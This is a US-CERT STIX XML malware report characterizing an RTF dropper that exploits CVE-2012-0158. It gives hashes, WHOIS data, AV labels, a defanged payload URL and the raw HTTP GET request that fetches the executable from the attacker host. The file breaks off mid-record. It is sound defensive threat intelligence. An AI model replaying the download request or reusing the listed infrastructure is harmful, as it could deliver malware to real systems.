@@ -1,0 +1,541 @@
+<stix:STIX_Package 
+	xmlns:cyboxCommon="http://cybox.mitre.org/common-2"
+	xmlns:cybox="http://cybox.mitre.org/cybox-2"
+	xmlns:cyboxVocabs="http://cybox.mitre.org/default_vocabularies-2"
+	xmlns:FileObj="http://cybox.mitre.org/objects#FileObject-2"
+	xmlns:HTTPSessionObj="http://cybox.mitre.org/objects#HTTPSessionObject-2"
+	xmlns:URIObj="http://cybox.mitre.org/objects#URIObject-2"
+	xmlns:WhoisObj="http://cybox.mitre.org/objects#WhoisObject-2"
+	xmlns:marking="http://data-marking.mitre.org/Marking-1"
+	xmlns:tlpMarking="http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1"
+	xmlns:TOUMarking="http://data-marking.mitre.org/extensions/MarkingStructure#Terms_Of_Use-1"
+	xmlns:maecBundle="http://maec.mitre.org/XMLSchema/maec-bundle-4"
+	xmlns:maecPackage="http://maec.mitre.org/XMLSchema/maec-package-2"
+	xmlns:maecVocabs="http://maec.mitre.org/default_vocabularies-1"
+	xmlns:incident="http://stix.mitre.org/Incident-1"
+	xmlns:indicator="http://stix.mitre.org/Indicator-2"
+	xmlns:ttp="http://stix.mitre.org/TTP-1"
+	xmlns:stixCommon="http://stix.mitre.org/common-1"
+	xmlns:stixVocabs="http://stix.mitre.org/default_vocabularies-1"
+	xmlns:stix-maec="http://stix.mitre.org/extensions/Malware#MAEC4.1-1"
+	xmlns:stix="http://stix.mitre.org/stix-1"
+	xmlns:NCCIC="http://www.us-cert.gov/"
+	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+	xsi:schemaLocation="
+	http://cybox.mitre.org/common-2 http://cybox.mitre.org/XMLSchema/common/2.1/cybox_common.xsd
+	http://cybox.mitre.org/cybox-2 http://cybox.mitre.org/XMLSchema/core/2.1/cybox_core.xsd
+	http://cybox.mitre.org/default_vocabularies-2 http://cybox.mitre.org/XMLSchema/default_vocabularies/2.1/cybox_default_vocabularies.xsd
+	http://cybox.mitre.org/objects#FileObject-2 http://cybox.mitre.org/XMLSchema/objects/File/2.1/File_Object.xsd
+	http://cybox.mitre.org/objects#HTTPSessionObject-2 http://cybox.mitre.org/XMLSchema/objects/HTTP_Session/2.1/HTTP_Session_Object.xsd
+	http://cybox.mitre.org/objects#URIObject-2 http://cybox.mitre.org/XMLSchema/objects/URI/2.1/URI_Object.xsd
+	http://cybox.mitre.org/objects#WhoisObject-2 http://cybox.mitre.org/XMLSchema/objects/Whois/2.1/Whois_Object.xsd
+	http://data-marking.mitre.org/Marking-1 http://stix.mitre.org/XMLSchema/data_marking/1.1.1/data_marking.xsd
+	http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1 http://stix.mitre.org/XMLSchema/extensions/marking/tlp/1.1.1/tlp_marking.xsd
+	http://data-marking.mitre.org/extensions/MarkingStructure#Terms_Of_Use-1 http://stix.mitre.org/XMLSchema/extensions/marking/terms_of_use/1.0.1/terms_of_use_marking.xsd
+	http://maec.mitre.org/XMLSchema/maec-bundle-4 http://maec.mitre.org/language/version4.1/maec_bundle_schema.xsd
+	http://maec.mitre.org/XMLSchema/maec-package-2 http://maec.mitre.org/language/version4.1/maec_package_schema.xsd
+	http://maec.mitre.org/default_vocabularies-1 http://maec.mitre.org/language/version4.1/maec_default_vocabularies.xsd
+	http://stix.mitre.org/Incident-1 http://stix.mitre.org/XMLSchema/incident/1.1.1/incident.xsd
+	http://stix.mitre.org/Indicator-2 http://stix.mitre.org/XMLSchema/indicator/2.1.1/indicator.xsd
+	http://stix.mitre.org/TTP-1 http://stix.mitre.org/XMLSchema/ttp/1.1.1/ttp.xsd
+	http://stix.mitre.org/common-1 http://stix.mitre.org/XMLSchema/common/1.1.1/stix_common.xsd
+	http://stix.mitre.org/default_vocabularies-1 http://stix.mitre.org/XMLSchema/default_vocabularies/1.1.1/stix_default_vocabularies.xsd
+	http://stix.mitre.org/extensions/Malware#MAEC4.1-1 http://stix.mitre.org/XMLSchema/extensions/malware/maec_4.1/1.0.1/maec_4.1_malware.xsd
+	http://stix.mitre.org/stix-1 http://stix.mitre.org/XMLSchema/core/1.1.1/stix_core.xsd" id="NCCIC:Package-1d754016-496b-4be4-9687-2a41a6ee0c7d" version="1.1.1" timestamp="2020-05-08T10:25:59-04:00">
+    <stix:STIX_Header>
+        <stix:Title>MIFR-10056799.r1.v2</stix:Title>
+        <stix:Package_Intent>Malware Characterization</stix:Package_Intent>
+        <stix:Handling>
+            <marking:Marking>
+                <marking:Controlled_Structure>//node() | //@*</marking:Controlled_Structure>
+                <marking:Marking_Structure xsi:type='tlpMarking:TLPMarkingStructureType' color="WHITE"/>
+                <marking:Marking_Structure xsi:type='TOUMarking:TermsOfUseMarkingStructureType'>
+                    <TOUMarking:Terms_Of_Use>This document is marked TLP:WHITE--Disclosure is not limited. Sources may use TLP:WHITE when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction. For more information on the Traffic Light Protocol (TLP), see http://www.us-cert.gov/tlp.</TOUMarking:Terms_Of_Use>
+                </marking:Marking_Structure>
+            </marking:Marking>
+        </stix:Handling>
+        <stix:Information_Source>
+            <stixCommon:Identity>
+                <stixCommon:Name>US-CERT</stixCommon:Name>
+            </stixCommon:Identity>
+            <stixCommon:Time>
+                <cyboxCommon:Produced_Time>2020-05-08T10:25:59-04:00</cyboxCommon:Produced_Time>
+            </stixCommon:Time>
+            <stixCommon:Tools>
+                <cyboxCommon:Tool>
+                    <cyboxCommon:Name>BMachine</cyboxCommon:Name>
+                    <cyboxCommon:Description>62</cyboxCommon:Description>
+                    <cyboxCommon:Version>7.1.0</cyboxCommon:Version>
+                </cyboxCommon:Tool>
+            </stixCommon:Tools>
+        </stix:Information_Source>
+    </stix:STIX_Header>
+    <stix:Observables cybox_major_version="2" cybox_minor_version="1" cybox_update_version="0">
+        <cybox:Observable id="NCCIC:Observable-d91d9c2f-aeb2-4a27-bbf2-0543a7db81af">
+            <cybox:Description><![CDATA[PRODUCT SPECIFICATION.doc is a malicious RTF file designed to download and install a malicious payload on the victim system. Once the RTF document is opened, the document attempts to download and install a malicious payload from a C2 server using the following URI:
+
+--Begin URI-- 
+hxxp://marianvanherp.nl/libraries/joomla/crypt/.new/austin2.exe
+--End URI--
+
+
+The following is a sample HTTP GET request observed during analysis:
+
+--Begin GET request--
+GET /libraries/joomla/crypt/.new/austin2.exe HTTP/1.1
+Accept: */*
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET4.0C; .NET4.0E)
+Host: marianvanherp.nl
+Connection: Keep-Alive
+--End GET request--
+
+
+Based on static analysis, it appears that the document attempts to download the payload into %Current Directory%\pong.exe before it is executed. The file the document attempted to download was not available for download at the time of analysis.]]></cybox:Description>
+            <cybox:Object id="NCCIC:File-4e1564e1-6aaa-4971-a27a-ca052b45c712">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:File_Name>PRODUCT SPECIFICATION.doc</FileObj:File_Name>
+                    <FileObj:Size_In_Bytes>1051884</FileObj:Size_In_Bytes>
+                    <FileObj:File_Format>Rich Text Format data, version 1, unknown character set</FileObj:File_Format>
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>803825fe1cb0f75d74cbf902c85fb42e</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>7f6d24bf03fc7d466e6300536169f6a103800756</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>96d217fc287e7ef0af46449eba405e4b49217834d6335a48b85519b75942c74c</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA512</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>37b254b509263ceabc925ad18da72c878e97fc6ba87f6b8b2c68d9f28cb2581d974c592f909605a57d9795f041f05b20f2488f5fa92ef1a688118aba6d8e7ca4</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>6144:qzgtSVS0sxCaDWW1acHoUu+zNTMEEfgJ3QIxjN8MoBCdvbWg8eg0z/codDz5bEY4:e+ZCKWlj</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                    <FileObj:Peak_Entropy>2.95695</FileObj:Peak_Entropy>
+                </cybox:Properties>
+                <cybox:Related_Objects>
+                    <cybox:Related_Object idref="NCCIC:URI-2140bb9f-984c-461f-a6d4-f1cca3141c32">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Connected_To</cybox:Relationship>
+                    </cybox:Related_Object>
+                </cybox:Related_Objects>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-f4ff6eee-7803-42ad-8f6b-719c6142acd3">
+            <cybox:Object id="NCCIC:URI-2140bb9f-984c-461f-a6d4-f1cca3141c32">
+                <cybox:Properties xsi:type="URIObj:URIObjectType" type="Domain Name">
+                    <URIObj:Value>marianvanherp.nl</URIObj:Value>
+                </cybox:Properties>
+                <cybox:Related_Objects>
+                    <cybox:Related_Object idref="NCCIC:WhoisEntry-cc3d49e0-210f-4d3c-b459-b8674e38644d">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Characterized_By</cybox:Relationship>
+                    </cybox:Related_Object>
+                    <cybox:Related_Object idref="NCCIC:HTTPSession-d8fb4212-6ef0-486b-927a-191c099b460a">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Related_To</cybox:Relationship>
+                    </cybox:Related_Object>
+                    <cybox:Related_Object idref="NCCIC:URI-bacd205d-b168-4010-b0da-60cdedd272b7">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Related_To</cybox:Relationship>
+                    </cybox:Related_Object>
+                    <cybox:Related_Object idref="NCCIC:File-4e1564e1-6aaa-4971-a27a-ca052b45c712">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Connected_From</cybox:Relationship>
+                    </cybox:Related_Object>
+                </cybox:Related_Objects>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-135199df-acd7-4d7b-8bb8-caf66f1fabc1">
+            <cybox:Object id="NCCIC:URI-bacd205d-b168-4010-b0da-60cdedd272b7">
+                <cybox:Properties xsi:type="URIObj:URIObjectType" type="URL">
+                    <URIObj:Value>hxxp://marianvanherp.nl/libraries/joomla/crypt/.new/austin2.exe</URIObj:Value>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-582bda36-6f4e-44a7-9eb3-f3829bd82864">
+            <cybox:Object id="NCCIC:HTTPSession-d8fb4212-6ef0-486b-927a-191c099b460a">
+                <cybox:Properties xsi:type="HTTPSessionObj:HTTPSessionObjectType">
+                    <HTTPSessionObj:HTTP_Request_Response>
+                        <HTTPSessionObj:HTTP_Client_Request>
+                            <HTTPSessionObj:HTTP_Request_Line/>
+                            <HTTPSessionObj:HTTP_Request_Header>
+                                <HTTPSessionObj:Raw_Header><![CDATA[GET /libraries/joomla/crypt/.new/austin2.exe HTTP/1.1
+Accept: */*
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET4.0C; .NET4.0E)
+Host: marianvanherp.nl
+Connection: Keep-Alive]]></HTTPSessionObj:Raw_Header>
+                            </HTTPSessionObj:HTTP_Request_Header>
+                        </HTTPSessionObj:HTTP_Client_Request>
+                    </HTTPSessionObj:HTTP_Request_Response>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-c36b18e5-f680-42ea-a321-977c86a14930">
+            <cybox:Object id="NCCIC:WhoisEntry-cc3d49e0-210f-4d3c-b459-b8674e38644d">
+                <cybox:Properties xsi:type="WhoisObj:WhoisObjectType">
+                    <WhoisObj:Remarks>Domain name: marianvanherp.nl
+Status:      active
+Reseller:
+   Hostingtime
+   Spieringwater 5
+   2993DM Barendrecht
+   Netherlands
+
+Registrar:
+   Mijn InternetOplossing B.V.
+   Markerkant 13 18
+   1314AN ALMERE
+   Netherlands
+
+DNSSEC:      no
+
+Domain nameservers:
+   ns1.hostingtime.eu
+   ns2.hostingtime.eu
+
+Record maintained by: NL Domain Registry
+inetnum:        185.69.232.0 - 185.69.235.255
+netname:        NL-SPANGOINTERNET-20140912
+descr:          Spango Internet B.V.
+org:            ORG-SIB86-RIPE
+country:        NL
+admin-c:        TF3211-RIPE
+tech-c:         TF3211-RIPE
+mnt-lower:      SPANGO-MNT
+mnt-routes:     SPANGO-MNT
+mnt-by:         RIPE-NCC-HM-MNT
+status:         ALLOCATED PA
+created:        2014-09-12T09:59:53Z
+last-modified:  2016-04-14T08:30:39Z
+source:         RIPE
+
+organisation:   ORG-SIB86-RIPE
+org-name:       Spango Internet B.V.
+org-type:       LIR
+address:        Koningsbeltweg 78
+address:        1329 AK
+address:        Almere
+address:        NETHERLANDS
+phone:          +31854014710
+e-mail:         info@spango.com
+abuse-c:        AC28594-RIPE
+mnt-ref:        SPANGO-MNT
+mnt-ref:        RIPE-NCC-HM-MNT
+mnt-by:         RIPE-NCC-HM-MNT
+abuse-mailbox:  admin@spango.com
+created:        2014-09-09T07:52:49Z
+last-modified:  2016-02-15T15:50:28Z
+source:         RIPE
+
+person:         T Fox
+address:        Spango Internet BV
+address:        Koningsbeltweg 78, 1329AK, Almere, The Netherlands
+phone:          +31854014710
+nic-hdl:        TF3211-RIPE
+mnt-by:         SPANGO-MNT
+created:        2014-09-10T15:19:46Z
+last-modified:  2014-09-10T15:22:46Z
+source:         RIPE
+
+% Information related to '185.69.232.0/22AS48635'
+
+route:          185.69.232.0/22
+descr:          Spango IPv4 Route
+origin:         AS48635
+mnt-by:         SPANGO-MNT
+created:        2015-08-13T19:49:30Z
+last-modified:  2015-08-13T19:49:30Z
+source:         RIPE</WhoisObj:Remarks>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+    </stix:Observables>
+    <stix:Indicators>
+        <stix:Indicator id="NCCIC:indicator-3f768cba-c3d0-4b52-9807-8ad2f82f2e42" timestamp="2020-05-08T14:26:26.891892+00:00" xsi:type='indicator:IndicatorType'>
+            <indicator:Title>MD5 and SHA1 of Malicious File</indicator:Title>
+            <indicator:Type>Malware Artifacts</indicator:Type>
+            <indicator:Observable id="NCCIC:Observable-f4d1383b-5fb2-4af9-bf69-de6aa503973a">
+                <cybox:Object id="NCCIC:File-acaaf1ec-d6be-4eb7-ba26-d765b8833329">
+                    <cybox:Properties xsi:type="FileObj:FileObjectType">
+                        <FileObj:Hashes>
+                            <cyboxCommon:Hash>
+                                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                                <cyboxCommon:Simple_Hash_Value condition="Equals">803825fe1cb0f75d74cbf902c85fb42e</cyboxCommon:Simple_Hash_Value>
+                            </cyboxCommon:Hash>
+                            <cyboxCommon:Hash>
+                                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                                <cyboxCommon:Simple_Hash_Value condition="Equals">7f6d24bf03fc7d466e6300536169f6a103800756</cyboxCommon:Simple_Hash_Value>
+                            </cyboxCommon:Hash>
+                            <cyboxCommon:Hash>
+                                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                                <cyboxCommon:Simple_Hash_Value condition="Equals">96d217fc287e7ef0af46449eba405e4b49217834d6335a48b85519b75942c74c</cyboxCommon:Simple_Hash_Value>
+                            </cyboxCommon:Hash>
+                        </FileObj:Hashes>
+                    </cybox:Properties>
+                </cybox:Object>
+            </indicator:Observable>
+            <indicator:Indicated_TTP>
+                <stixCommon:TTP idref="NCCIC:ttp-e6f8e8fc-d0d4-423c-829c-4e483e3c4aa2" xsi:type='ttp:TTPType'/>
+            </indicator:Indicated_TTP>
+            <indicator:Indicated_TTP>
+                <stixCommon:TTP idref="NCCIC:ttp-f9aa82b4-5d2e-47d0-b538-880696c8ac6f" xsi:type='ttp:TTPType'/>
+            </indicator:Indicated_TTP>
+            <indicator:Indicated_TTP>
+                <stixCommon:TTP idref="NCCIC:ttp-d71501b9-5492-4a43-852c-a13cb73b0c06" xsi:type='ttp:TTPType'/>
+            </indicator:Indicated_TTP>
+            <indicator:Indicated_TTP>
+                <stixCommon:TTP idref="NCCIC:ttp-1867cc89-3fc7-4843-9cf3-9d89d6f255e1" xsi:type='ttp:TTPType'/>
+            </indicator:Indicated_TTP>
+            <indicator:Producer>
+                <stixCommon:Identity>
+                    <stixCommon:Name>NCCIC</stixCommon:Name>
+                </stixCommon:Identity>
+                <stixCommon:Time>
+                    <cyboxCommon:Produced_Time>2020-05-08T14:26:26+00:00</cyboxCommon:Produced_Time>
+                </stixCommon:Time>
+            </indicator:Producer>
+        </stix:Indicator>
+        <stix:Indicator id="NCCIC:indicator-b05094d4-31a2-497a-85cb-e1d9d5615331" timestamp="2020-05-08T14:26:26.937342+00:00" xsi:type='indicator:IndicatorType'>
+            <indicator:Title>Malicious Domain</indicator:Title>
+            <indicator:Type>Domain Watchlist</indicator:Type>
+            <indicator:Observable id="NCCIC:Observable-15e6dd35-fa6e-42d5-96fe-539173db9e18">
+                <cybox:Object id="NCCIC:URI-55937c19-1905-47f4-ae85-30eebc488771">
+                    <cybox:Properties xsi:type="URIObj:URIObjectType" type="Domain Name">
+                        <URIObj:Value condition="Equals">marianvanherp.nl</URIObj:Value>
+                    </cybox:Properties>
+                </cybox:Object>
+            </indicator:Observable>
+            <indicator:Indicated_TTP>
+                <stixCommon:TTP idref="NCCIC:ttp-8015444b-e19f-41f0-b365-43bf7393da18" xsi:type='ttp:TTPType'/>
+            </indicator:Indicated_TTP>
+            <indicator:Producer>
+                <stixCommon:Identity>
+                    <stixCommon:Name>NCCIC</stixCommon:Name>
+                </stixCommon:Identity>
+                <stixCommon:Time>
+                    <cyboxCommon:Produced_Time>2020-05-08T14:26:26+00:00</cyboxCommon:Produced_Time>
+                </stixCommon:Time>
+            </indicator:Producer>
+        </stix:Indicator>
+    </stix:Indicators>
+    <stix:TTPs>
+        <stix:TTP id="NCCIC:ttp-e6f8e8fc-d0d4-423c-829c-4e483e3c4aa2" timestamp="2020-05-08T14:26:26.890783+00:00" xsi:type='ttp:TTPType'>
+            <ttp:Title>MAEC Characterization of 803825fe1cb0f75d74cbf902c85fb42e</ttp:Title>
+            <ttp:Behavior>
+                <ttp:Malware>
+                    <ttp:Malware_Instance xsi:type='stix-maec:MAEC4.1InstanceType'>
+                        <stix-maec:MAEC id="NCCIC:package-64a81e85-a4e4-40c1-804c-5cce556a6222" schema_version="2.1">
+                            <maecPackage:Malware_Subjects>
+                                <maecPackage:Malware_Subject id="NCCIC:malware_subject-434c6f53-6817-46eb-9ccd-896104e89157">
+                                    <maecPackage:Malware_Instance_Object_Attributes idref="NCCIC:File-4e1564e1-6aaa-4971-a27a-ca052b45c712"/>
+                                    <maecPackage:Findings_Bundles>
+                                        <maecPackage:Bundle defined_subject="true" id="NCCIC:bundle-22227c8c-b447-4abb-b7ae-bf328e909d7e" schema_version="4.1">
+                                            <maecBundle:AV_Classifications>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>McAfee</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Exploit-CVE2012-0158.n</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Symantec</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Trojan.Mdropper</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Antiy</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Trojan[Exploit]/Office.CVE-2012-0158.h</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>BitDefender</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Exploit.RTF-ObfsStrm.Gen</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Microsoft Security Essentials</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Exploit:Win32/CVE-2012-0158</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Sophos</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Troj/DocDrop-DT</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>TrendMicro House Call</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>TROJ_CV.511E971F</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>TrendMicro</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>TROJ_CV.511E971F</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Emsisoft</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Exploit.RTF-ObfsStrm.Gen (B)</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Ahnlab</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>RTF/Dropper</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>ESET</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Win32/Exploit.CVE-2012-0158.AC trojan</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>NANOAV</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Exploit.Rtf.Heuristic-rtf.dinbqn</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>TACHYON</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Exploit.RTF-ObfsStrm.Gen</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Quick Heal</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Exp.RTF.CVE-2012-2539</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Ikarus</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Exploit.Win32.CVE-2012-0158</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                            </maecBundle:AV_Classifications>
+                                        </maecPackage:Bundle>
+                                    </maecPackage:Findings_Bundles>
+                                </maecPackage:Malware_Subject>
+                            </maecPackage:Malware_Subjects>
+                        </stix-maec:MAEC>
+                    </ttp:Malware_Instance>
+                </ttp:Malware>
+            </ttp:Behavior>
+            <ttp:Resources>
+                <ttp:Infrastructure>
+                    <ttp:Observable_Characterization cybox_major_version="2" cybox_minor_version="1" cybox_update_version="0">
+                        <cybox:Observable idref="NCCIC:Observable-d91d9c2f-aeb2-4a27-bbf2-0543a7db81af">
+                        </cybox:Observable>
+                    </ttp:Observable_Characterization>
+                </ttp:Infrastructure>
+            </ttp:Resources>
+        </stix:TTP>
+        <stix:TTP id="NCCIC:ttp-f9aa82b4-5d2e-47d0-b538-880696c8ac6f" timestamp="2020-05-08T14:26:26.912936+00:00" xsi:type='ttp:TTPType'>
+            <ttp:Title>CVE-2012-0158</ttp:Title>
+            <ttp:Resources>
+                <ttp:Infrastructure>
+                    <ttp:Observable_Characterization cybox_major_version="2" cybox_minor_version="1" cybox_update_version="0">
+                        <cybox:Observable idref="NCCIC:Observable-d91d9c2f-aeb2-4a27-bbf2-0543a7db81af">
+                        </cybox:Observable>
+                    </ttp:Observable_Characterization>
+                </ttp:Infrastructure>
+            </ttp:Resources>
+        </stix:TTP>
+        <stix:TTP id="NCCIC:ttp-d71501b9-5492-4a43-852c-a13cb73b0c06" timestamp="2020-05-08T14:26:26.913500+00:00" xsi:type='ttp:TTPType'>
+            <ttp:Title>dropper</ttp:Title>
+            <ttp:Resources>
+                <ttp:Infrastructure>
+                    <ttp:Observable_Characterization cybox_major_version="2" cybox_minor_version="1" cybox_update_version="0">
+                        <cybox:Observable idref="NCCIC:Observable-d91d9c2f-aeb2-4a27-bbf2-0543a7db81af">
+                        </cybox:Observable>
+                    </ttp:Observable_Characterization>
+                </ttp:Infrastructure>
+            </ttp:Resources>
+        </stix:TTP>
+        <stix:TTP id="NCCIC:ttp-1867cc89-3fc7-4843-9cf3-9d89d6f255e1" timestamp="2020-05-08T14:26:26.914006+00:00" xsi:type='ttp:TTPType'>
+            <ttp:Title>trojan</ttp:Title>
+            <ttp:Resources>
+                <ttp:Infrastructure>
+                    <ttp:Observable_Characterization cybox_major_version="2" cybox_minor_version="1" cybox_update_version="0">
+                        <cybox:Observable idref="NCCIC:Observable-d91d9c2f-aeb2-4a27-bbf2-0543a7db81af">
+                        </cybox:Observable>
+                    </ttp:Observable_Characterization>
+                </ttp:Infrastructure>
+            </ttp:Resources>
+        </stix:TTP>
+        <stix:TTP id="NCCIC:ttp-8015444b-e19f-41f0-b365-43bf7393da18" timestamp="2020-05-08T14:26:26.938504+00:00" xsi:type='ttp:TTPType'>
+            <ttp:Title>command-and-control</ttp:Title>
+            <ttp:Resources>
+                <ttp:Infrastructure>
+                    <ttp:Observable_Characterization cybox_major_version="2" cybox_minor_version="1" cybox_update_version="0">
+                        <cybox:Observable idref="NCCIC:Observable-f4ff6eee-7803-42ad-8f6b-719c6142acd3">
+                        </cybox:Observable>
+                    </ttp:Observable_Characterization>
+                </ttp:Infrastructure>
+            </ttp:Resources>
+        </stix:TTP>
+    </stix:TTPs>
+    <stix:Incidents>
+        <stix:Incident id="NCCIC:incident-4392c1eb-efe0-45e8-8b6e-918ea4995ef4" timestamp="2020-05-07T13:32:26-04:00" xsi:type='incident:IncidentType'>
+            <incident:Title>10056799.r1.v2</incident:Title>
+            <incident:Description><![CDATA[##### Incident Summary #####
+
+None
+
+##### Report Summary #####
+
+Submission included one malicious RTF file. The primary purpose of this file is to download and install a malicious payload on the infected system.
+
+This report contains preliminary analysis and is not intended to be a complete description of the submitted artifacts' capabilities. Results may be incomplete due to the artifacts' complexity or ability to defend against analysis techniques. If additional information is required, please contact the US-CERT Security Operations Center using the information at the end of this report.
+
+Analysis Environment: 32_bit, windows_7
+
+##### Conclusion #####
+
+None
+
+##### Mitigation #####
+
+None]]></incident:Description>
+            <incident:Categories>
+                <incident:Category xsi:type="stixVocabs:IncidentCategoryVocab-1.0">Malicious Code</incident:Category>
+            </incident:Categories>
+            <incident:Related_Indicators>
+                <incident:Related_Indicator>
+                    <stixCommon:Indicator idref="NCCIC:indicator-3f768cba-c3d0-4b52-9807-8ad2f82f2e42" xsi:type='indicator:IndicatorType'/>
+                </incident:Related_Indicator>
+                <incident:Related_Indicator>
+                    <stixCommon:Indicator idref="NCCIC:indicator-b05094d4-31a2-497a-85cb-e1d9d5615331" xsi:type='indicator:IndicatorType'/>
+                </incident:Related_Indicator>
+            </incident:Related_Indicators>
+            <incident:Related_Observables>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-d91d9c2f-aeb2-4a27-bbf2-0543a7db81af">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-f4ff6eee-7803-42ad-8f6b-719c6142acd3">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
